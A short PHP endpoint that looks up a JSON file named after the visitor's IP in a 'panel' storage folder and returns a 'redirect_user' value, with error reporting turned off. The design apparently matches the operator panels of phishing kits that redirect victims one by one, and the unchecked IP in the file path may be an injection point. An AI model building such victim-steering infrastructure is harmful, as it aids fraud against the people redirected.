<?php
session_start();
error_reporting(0);
include '../setting/functions.php';

$ip = get_client_ip();
$name_file = $ip;
$infoFilePath = "../panel/storage/{$name_file}.json";
if (file_exists($infoFilePath)) {
    $json_data = file_get_contents($infoFilePath);
    $infoContent = json_decode($json_data, true);
    if (isset($infoContent['redirect_user']) && !empty($infoContent['redirect_user'])) {
        echo json_encode(['redirect_user' => $infoContent['redirect_user']]);
    } else {
        echo json_encode(['redirect_user' => '']);
    }
} else {
    echo json_encode(['error' => 'File not found']);
}
?>
